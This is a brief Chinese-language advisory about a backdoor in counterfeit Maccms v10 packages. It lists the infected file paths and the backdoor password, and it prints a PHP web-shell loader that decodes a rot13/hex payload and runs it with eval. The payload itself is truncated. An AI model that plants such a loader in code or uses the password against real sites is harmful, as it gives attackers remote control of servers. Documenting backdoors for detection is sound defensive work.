Maccms后门
==========

一、漏洞简介
------------

有人假冒苹果cms官网，发布带有后门的程序。

二、漏洞影响
------------

version v10

三、复现过程
------------

### 后门文件路径

maccms10\\extend\\upyun\\src\\Upyun\\Api\\Format.php

maccms10\\extend\\Qcloud\\Sms\\Sms.php

密码 WorldFilledWithLove

### 后门样本

    <?php
    error_reporting(E_ERROR);
    @ini_set('display_errors','Off');
    @ini_set('max_execution_time',20000);
    @ini_set('memory_limit','256M');
    header("content-Type: text/html; charset=utf-8");
    $password = "0d41c75e2ab34a3740834cdd7e066d90";
    function s(){
     $str = "66756r6374696s6r207374…………"; //大马
     $str = str_rot13($str);
     m($str);
    }
    function m($str){
     global $password;
     $jj = '';
     eval($jj.pack('H*',$str).$jj);
    }
    s();
    ?>

image
